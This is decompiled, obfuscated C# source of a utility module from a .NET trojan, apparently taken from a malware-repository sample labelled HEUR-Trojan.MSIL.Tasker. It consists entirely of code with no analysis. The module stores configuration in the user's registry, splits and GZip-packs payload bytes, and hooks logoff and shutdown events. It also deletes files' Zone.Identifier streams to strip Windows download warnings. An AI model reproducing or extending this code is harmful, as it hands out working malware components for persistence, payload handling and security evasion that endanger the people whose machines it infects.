// Decompiled with JetBrains decompiler
// Type: 金席行商她.命澤成的敬太
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using 家執是成程尊首席受的生顧引生;
using 成官執望是導;

namespace 金席行商她
{
  [StandardModule]
  internal sealed class 命澤成的敬太
  {
    public static byte[] 公顧的的澤(string 命合金澤玉法命官玉城司) => Encoding.UTF8.GetBytes(命合金澤玉法命官玉城司);

    public static string 澤成將希商使金成是承的承成(byte[] 家官的玉希尊受公望太人商) => Encoding.UTF8.GetString(家官的玉希尊受公望太人商);

    public static object 的命敬席顧席商望導接顧玉(string 人顧管為望使執)
    {
      try
      {
        Registry.CurrentUser.CreateSubKey("Software\\" + 的公的人官導官太命程.將太將金法司子的()).DeleteValue(人顧管為望使執);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    public static string 導子金人承導敬人行席望人(string 澤人城公敬公受孫太合將顧的顧)
    {
      string str;
      try
      {
        str = Conversions.ToString(Registry.CurrentUser.CreateSubKey("Software\\" + 的公的人官導官太命程.將太將金法司子的()).GetValue(澤人城公敬公受孫太合將顧的顧, (object) ""));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = (string) null;
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static object 程金的希尊顧的行顧席司玉家(string 玉太敬的希承顧的, string 孫程希太孫引商)
    {
      object obj;
      try
      {
        Registry.CurrentUser.CreateSubKey("Software\\" + 的公的人官導官太命程.將太將金法司子的()).SetValue(玉太敬的希承顧的, (object) 孫程希太孫引商);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static Array 的引澤尊法官顧人敬子的命生太(byte[] 為的人孫成她, string 席合命執管顧澤命行管玉行)
    {
      List<byte[]> numArrayList = new List<byte[]>();
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2 = new MemoryStream();
      string[] strArray = Strings.Split(命澤成的敬太.澤成將希商使金成是承的承成(為的人孫成她), 席合命執管顧澤命行管玉行);
      memoryStream1.Write(為的人孫成她, 0, strArray[0].Length);
      memoryStream2.Write(為的人孫成她, checked (strArray[0].Length + 席合命執管顧澤命行管玉行.Length), checked (為的人孫成她.Length - strArray[0].Length + 席合命執管顧澤命行管玉行.Length));
      numArrayList.Add(memoryStream1.ToArray());
      numArrayList.Add(memoryStream2.ToArray());
      memoryStream1.Dispose();
      memoryStream2.Dispose();
      return (Array) numArrayList.ToArray();
    }

    public static void 的的顧導程尊法生的顧引成顧(object 金官澤太生公程將希行管引合太, SessionEndingEventArgs 首顧席的子望人)
    {
      if (首顧席的子望人.Reason == SessionEndReasons.Logoff)
      {
        為程席顧接希顧繼商生.將顧的金合為成子();
      }
      else
      {
        if (首顧席的子望人.Reason != SessionEndReasons.SystemShutdown)
          return;
        為程席顧接希顧繼商生.將顧的金合為成子();
      }
    }

    public static byte[] 是望的澤太承太商她孫(byte[] 商子的官是公承顧, ref bool 執首她的顧的席希將命使)
    {
      byte[] numArray;
      if (執首她的顧的席希將命使)
      {
        byte[] buffer = (byte[]) null;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress, true);
          gzipStream.Write(商子的官是公承顧, 0, 商子的官是公承顧.Length);
          gzipStream.Dispose();
          memoryStream.Position = 0L;
          buffer = new byte[checked ((int) memoryStream.Length + 1 - 1 + 1)];
          memoryStream.Read(buffer, 0, buffer.Length);
          memoryStream.Dispose();
        }
        numArray = buffer;
      }
      else
      {
        byte[] array = (byte[]) null;
        using (MemoryStream memoryStream = new MemoryStream(商子的官是公承顧))
        {
          GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
          byte[] buffer = new byte[4];
          memoryStream.Position = checked (memoryStream.Length - 5L);
          memoryStream.Read(buffer, 0, 4);
          int int32 = BitConverter.ToInt32(buffer, 0);
          memoryStream.Position = 0L;
          array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
          gzipStream.Read(array, 0, int32);
          gzipStream.Dispose();
          memoryStream.Dispose();
        }
        numArray = array;
      }
      return numArray;
    }

    [DllImport("kernel32.dll", EntryPoint = "DeleteFile", CharSet = CharSet.Auto, SetLastError = true, ThrowOnUnmappableChar = true, BestFitMapping = false)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool 顧使玉敬合顧合命家官([MarshalAs(UnmanagedType.LPTStr)] string 顧生的承管為);

    public static void 管司程官的尊(string 玉城城公的金命法法顧的城太望)
    {
      try
      {
        命澤成的敬太.顧使玉敬合顧合命家官(玉城城公的金命法法顧的城太望 + ":Zone.Identifier");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
